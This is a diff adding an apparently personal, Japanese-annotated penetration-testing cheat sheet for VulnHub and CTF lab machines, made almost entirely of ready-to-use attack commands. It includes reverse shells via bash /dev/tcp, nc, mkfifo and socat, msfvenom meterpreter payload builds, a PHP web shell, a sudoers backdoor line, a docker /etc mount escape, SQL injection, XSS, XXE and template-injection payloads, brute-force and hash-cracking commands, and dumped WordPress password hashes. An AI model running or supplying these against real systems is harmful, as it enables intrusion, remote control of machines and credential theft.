@@ -1,0 +1,336 @@
+gobuster－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt
+gobuster dir -u 192.168.56.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html,txt
+gobuster fuzz -w /usr/share/wordlists/dirb/common.txt -u http://$ip/~FUZZ -b 404
+gobuster fuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-small..txt -u http://$ip/~secret/. FUZZ.txt -b 404,403 (編集済)
+
+nmap－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+nmap -sC -sV $IP --open -p-
+nmap -p- -Pn -P0 192.168.56.108
+sudo nmap -sS -A -T4 -oN nmap_output.txt 192.168.56.109
+nmap -Pn -A --osscan-guess -p- $IP -oN ./nmap_output --system-dns
+sudo nmap -sS -sV -A -sC -T4 -v $IP
+sudo nmap -sS -A $IP --system-dns -oX scan.xml
+sudo nmap -sT -sC -sV $IP
+nmap -sC -sV $IP --system-dns
+nmap -Pn -p 1-65535 -sV $IP --system-dns -oX ub1404.xml
+sudo nmap -sV -Pn -p- $IP --system-dns -oX scan.xml --system-dns
+
+fping－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sudo fping -a -r 0 -g 192.168.56.0/24
+sudo fping -aqg 192.168.56.0/24
+
+wig－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+wig
+
+export－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+export TERM=xterm
+
+
+john－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+/usr/share/wordlists/rockyou.txt
+
+sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ./win_smb_passhash.txt --session=win2k8
+sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt -session=lupin
+sudo john --format=raw-md5 hash.txt
+hydra ssh://$IP -L names.txt -P /usr/share/john/password.lst -v -t 4
+sed -e 's/decodestring/decodebytes/g' /usr/share/john/ssh2john.py | python3 - id_rsa.txt
+python3 /usr/share/john/ssh2john.py id_rsa > passphrase_hash.txt
+sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+
+gzip－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sudo gzip -d rockyu.txt.gz
+
+nc－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+mkfifo /tmp/qprrh; nc 192.168.56.102 4444 0</tmp/qprrh | /bin/sh >/tmp/qprrh 2>&1; rm /tmp/qprrh
+rlwrap -c -pCyan nc -nlvp 4444
+リバースシェル　nc 192.168.56.102 4444 -e /bin/bash
+nc -nlvp 4444
+
+echo－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+echo "aaa ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers 
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh < $(tty) > $(tty) 2> $(tty)')" > $TF/setup.py 
+
+socat file:`tty`,raw,echo=0 tcp-listen:4444 
+<?php echo system($_GET['cmd']); ?>
+echo "/bin/bash -c 'bash -i > /dev/tcp/192.168.56.102/1234 0<&1 2>&1'" | php -R 'echo urlencode($argn),"\n";' 
+echo "/bin/bash -c 'bash -i > /dev/tcp/192.168.56.102/1234 0<&1 2>&1'" 
+stty raw -echo;fg
+echo $0
+echo "aaa ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+
+bash－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+bash -i >& /dev/tcp/192.168.56.102/5555 0>&1
+
+python3－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sed -e 's/decodestring/decodebytes/g' /usr/share/john/ssh2john.py | python3 - id_rsa.txt
+python3 /usr/share/john/ssh2john.py id_rsa > passphrase_hash.txt
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
+sudo python3 -m http.server 80
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+
+rlwrap－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+rlwrap -c -pCyan nc -nlvp 4444
+
+対話的シェル－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+python3 -c 'import pty; pty.spawn("/bin/bash")' (編集済)
+stty raw -echo;fg
+export TERM=xterm
+
+
+/home/user/vulnhub/SecLists/Discovery/Web-Content/raft-large-files.txt
+
+find－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+find / -perm -4000 -ls 2> /dev/null
+find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2> /dev/null
+
+
+netdiscover－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sudo netdiscover -i enp0s3 -r 192.168.56.0/24
+
+aircrack-ng－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+aircrack-ng WPA-01.cap -w /usr/share/wordlists/rockyou.txt
+
+
+
+PHPでのLFI－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+http://192.168.56.109/?page=php://filter/convert.base64-encode/resource=login.php (編集済)
+
+
+リバースシェル－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+リバースシェル
+echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh < $(tty) > $(tty) 2> $(tty)')" > $TF/setup.py 
+sudo pip install $TF
+リバースシェル
+curl http://192.168.56.118/site/busque.php --get --data-urlencode "buscar=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/443 0>&1'" 
+多分リバースシェル
+socat file:`tty`,raw,echo=0 tcp-listen:4444 
+socat exec:'bash -li',pty,stderr,setsid,sane tcp:192.168.56.102:4444
+リバースシェル
+/bin/bash -i >& /dev/tcp/<攻撃端末のipアドレス>/<ポート番号>  0>&1 (編集済)
+/bin/bash -i > /dev/tcp/<攻撃端末のipアドレス>/<ポート番号>  0<&1 2>&1
+リバースシェル　echo "/bin/bash -c 'bash -i > /dev/tcp/192.168.56.102/1234 0<&1 2>&1'" 
+リバースシェル　nc 192.168.56.102 4444 -e /bin/bash
+
+arp-scan－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sudo arp-scan -l
+sudo arp-scan --localne
+
+wfuzz－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+wfuzz -c -z file,/home/user/vulnhub/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$ip/~FUZZ/"
+wfuzz -u "$URL/secret/evil.php?FUZZ=../../../../etc/passwd" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 0
+
+<?php echo system($_GET['cmd']); ?>－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+<?php echo system($_GET['cmd']); ?>
+
+
+curl－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+curl -OL http://192.168.56.117/-secret/.mysecret.txt
+リバースシェル
+curl http://192.168.56.118/site/busque.php --get --data-urlencode "buscar=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.102/443 0>&1'" 
+curl http://$ip/site/budque.php?buscar=id
+curl http://$ip/site/busque.php --get --data-urlencode "buscar=which curl"
+curl -X POST http://192.168.56.114/404.php
+curl http://192.168.56.110/secret/evil.php?command=/home/mowree/.ssh/id_rsa
+
+dirb－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+dirb $URL -r
+
+wpscan－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+wpscan --url http://deathnote.vuln/wordpress/
+wpscan --url  $URL --usernames elliot --password ./fsocity.dic
+sudo gem install wpscan
+wpscan --url $URL/wordpress --enumerate u
+
+hydra－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+hydra -l test -P /usr/share/wordlists/rockyou.txt microson.ctf.site http-get-form "/login?username=^USER^&password=^PASS^:F=wrong_credentials"
+hydra -l test -P /usr/share/wordlists/rockyou.txt http-get://microson.ctf.site:20080/
+hydra 192.168.56.114 -l elliot -P ./vulnhub/mr-robot/filtered_fsocity.dic http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.114%2Fwp-admin%2F&testcookie=1:is incorrect"
+hydra $IP -L ./filtered_fsocity.dic -p test http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.56.114%2Fwp-admin%2F&testcookie=1:Invalid username"
+hydra -l test -P ~/vulnhub/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt $IP http-post-form "/kzMb5nVYJw/index.php:key=^PASS^: invalid key" 
+hydra ssh://$IP -L names.txt -P /usr/share/john/password.lst -v -t 4
+
+ps－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+ps -aux
+
+mysql－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+C:\wamp\bin\mysql\mysql5.5.20\bin\mysql.exe -u root --password="" -e "use cards; show tables; select * from queen_of_hearts;"
+あんこ — 2024/08/14 19:00
+C:\wamp\bin\mysql\mysql5.5.20\bin\mysql.exe -u root --password="" -e "show databases"
+mysql -h localhost -u root -pR@v3nSecurity
+
+sqlmap－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sqlmap -u "http://192.168.56.113/kzMb5nVYJw/420search.php?usrtosearch=" -D seth -T users -C id,position,user,pass --dump
+sqlmap -u "/http://192.168.56.112/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --threads=10 --dbms=mysql -D jabcd0cs --tables
+sqlmap -u "/http://192.168.56.112/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --threads=10 --dbms=mysql -D jabcd0cs -T odm_user --columns
+sqlmap -u "/http://192.168.56.112/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbs --threads=10 --dbms=MySQL
+
+SELECT－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+SELECT username, password FROM users WHERE username='ad'||'min' group by ' AND password='''
+C:\wamp\bin\mysql\mysql5.5.20\bin\mysql.exe -u root --password="" -e "use cards; show tables; select * from queen_of_hearts;"
+SELECT concat_ws(':',user_login,user_pass) FROM wp_users INTO OUTFILE 'C:\wamp\www\wordpress\wp-content/uploads\wp_hashes.txt';
+SELECT concat_ws(':',user_login,user_pass) FROM wp_users;
+SELECT id ,user_login,user_pass FROM wp_users;
+'UNION SELECT username, password, null, null FROM payroll.users # 
+'UNION SELECT column_name, null,null,null FROM information_schema.columns WHERE table_schema = 'payroll'  AND table_name = 'users' # 
+'UNION SELECT table_name, null,null,null FROM information_schema.tables WHERE table_schema = 'payroll' # 
+'UNION SELECT table_name, null,null,null FROM information_schema.tables # 
+'UNION SELECT @@version,@@hostname,database(),user() # 
+'UNION SELECT @@version, null,null,null #
+select concat(user_login, ":",user_pass) from wp_users into outfile '/tmp/hash.txt';
+select * from wp_users\G
+
+source－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+source path/to/venv/bin/activate
+
+droopescan－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+droopescan scan -u http://192.168.56.112/jabc/
+
+/bin/bash -i－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+/bin/bash -i
+
+g++－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+
+eyewitness－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+eyewitness -x scan.xml --web
+
+nikto－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+nikto -h $URL
+
+socat－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+socat file:`tty`,raw,echo=0 tcp-listen:4444 (編集済)
+socat exec:'bash -li',pty,stderr,setsid,sane tcp:192.168.56.102:4444
+
+msfvenom－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+msfvenom -a x86 --platform windows -p windows/meterpreter_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f exe -o ./evil.exe 
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=5555 -a php --platform php -f raw > ./shell.php
+msfvenom --payload linux/x86/shell/reverse_tcp --platform linux --arch x86 LHOST=192.168.56.102 LPORT=4444 --format elf --out ./evil
+msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.56.102 LPORT=4444
+
+mkfifo－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+mkfifo /tmp/qprrh; nc 192.168.56.102 4444 0</tmp/qprrh | /bin/sh >/tmp/qprrh 2>&1; rm /tmp/qprrh
+
+iptables－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sudo iptables -A PREROUTING -t nat -p tcp --dport 400:65535 -j REDIRECT --to-port 1234
+sudo iptables -t nat -Lcurl http://$ip/site/busque.php --get --data-urlencode "buscar=which curl"
+
+－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+import requests
+url = "http://192.168.56.118/site/busque.php?buscar-telnet%20192.168.56.101%20"
+for i in range(400, 65536):
+try:
+payload = url + str(i)
+req = requests.get(payload, timeout=1)
+if "Connected" in req.text:
+print(i)
+except:
+pass
+－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+
+tcpdump－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+sudo tcpdump -i enp0s3 host 192.168.56.102 and host 192.168.56.118
+
+－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py
+－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+import os
+os.system("/bin/bash")
+TF=$(mktemp -d)
+－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+
+ffuf－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+ffuf -u "http://$ip/~secret/FUZZ" -w /home/user/vulnhub/SecLists/Discovery/Web-Content/raft-large-directories.txt -e .txt,.php,bak,html -mc 200
+
+
+hexdump－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+hexdump 00000020.zip -C
+
+docker－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+docker exec -it コンテナID /bin/bash
+docker run -dit -v /etc:/root ubuntu
+docker exec -it e92c65822e76 /bin/bash
+docker run -dit -v /etc:/root ubuntu
+
+SQL－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+'OR 1=1 #
+'UNION SELECT @@version, null,null,null #
+'UNION SELECT @@version,@@hostname,database(),user() # (編集済)
+'UNION SELECT table_name, null,null,null FROM information_schema.tables # (編集済)
+'UNION SELECT table_name, null,null,null FROM information_schema.tables WHERE table_schema = 'payroll' # (編集済)
+'UNION SELECT column_name, null,null,null FROM information_schema.columns WHERE table_schema = 'payroll'  AND table_name = 'users' # (編集済)
+'UNION SELECT username, password, null, null FROM payroll.users # (編集済)
+UPDATE wp_users SET user_pass = MD5('TestPassword') WHERE ID=4;
+
+wget－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+wget http://192.168.56.201:8585/wordpress/wp-content/uploads/wp_hashes.txt
+
+cut－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+cut -f 2 -d ":" wp_hashes.txt > hashes.txt
+admin:$P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
+vagrant:$P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/
+user:$P$B83ijKvzkiB6yZL8Ubpi35CMQHiQjv/
+manager:$P$BvcrF0Y02JqJRkbXMREj/CBvP..21s1
+$P$B2PFjjNJHOQwDzqrQxfX4GYzasKQoN0
+$P$BMO//62Hj1IFeIr0XuJUqMmtBllnzN/
+$P$B83ijKvzkiB6yZL8Ubpi35CMQHiQjv/
+$P$BvcrF0Y02JqJRkbXMREj/CBvP..21s1
+
+
+
+windows－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+C:\wamp\bin\mysql\mysql5.5.20\bin\mysql.exe -u root --password="" -e "show databases"
+dir
+type dfsfwfv
+C:\wamp\bin\mysql\mysql5.5.20\bin\mysql.exe -u root --password="" -e "use cards; show tables; select * from queen_of_hearts;"
+
+cd wordpress\
+
+wc -c
+bc
+eom queen_of_hearts.bin
+
+davtest -url http://192.168.56.201:8585/uploads/
+davtest -url http://192.168.56.201:8585/uploads/ -uploadfile ./web_shell.php  -uploadloc cmd.php
+
+remmina -c rdp://vagrant@192.168.56.201
+
+portfwd add -l 3389 -p 3389 -r 192.168.56.201
+portfwd flush
+portfwd delete -l 3389 -p 3389 -r 192.168.56.201
+netstat -antup | grep 3389
+remmina -c rdp://vagrant@127.0.0.1:3389
+remmina -c rdp://vagrant@192.168.56.201
+－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+
+解析ツール－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+angr z3 ida gdb
+－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+
+web security academy－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
+Angular
+
+https://your-lab-id.web-security-academy.net/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
+
+${{<%[%'"}}%\
+
+{"$ne": null}
+
+XXE－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+XML external entity Injection
+
+SQLinjection－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+' or '1' = '1';--
+
+CTF－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－－
+<?php
+class access_log{
+    public $log_file="../flag";
+}
+print(urlencode(base64_encode(serialize(new access_log()))))
+?> 
+
+......................................................................\app\templates\errors\ab{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n Y2F0IC9hcHAvZmxhZy1jOGY1NTI2Yy00MTIyLTQ1NzgtOTZkZS1kN2RkMjcxOTM3OTgudHh0 | base64 -d | bash")["read"]() %}{{a}}{% endwith %}
